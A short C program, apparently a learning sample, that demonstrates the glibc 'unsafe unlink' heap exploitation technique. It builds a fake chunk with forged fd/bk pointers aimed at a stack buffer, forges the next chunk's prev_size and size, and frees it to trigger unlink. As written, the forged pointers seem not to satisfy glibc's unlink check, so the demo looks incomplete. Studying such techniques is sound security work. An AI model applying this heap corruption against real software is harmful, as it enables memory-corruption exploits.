#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<malloc.h>
#include<assert.h>

int main(){
	
	char *A = malloc(0x20);
	char *B = malloc(0x410); //
	char *C = malloc(0x410); // lead chunk
	char *D = malloc(0x10);
	char target[8];
	strcpy(target,"N0zoM1z0");
	long long *p_t = (long long*)target;
	long long *p_B = (long long*)B;
	p_B[0] = 0;
	p_B[1] = 0x411;
	p_B[2] = p_t - 3; // fd
	p_B[3] = p_t - 2; // bk
	
	long long *p_C = (long long*)C;
	p_C[-2] = 0x410; // C's prev_size
	p_C[-1] = 0x420; // C's size
	
	// trigger unlink
	free(C);
	
	return 0;
}
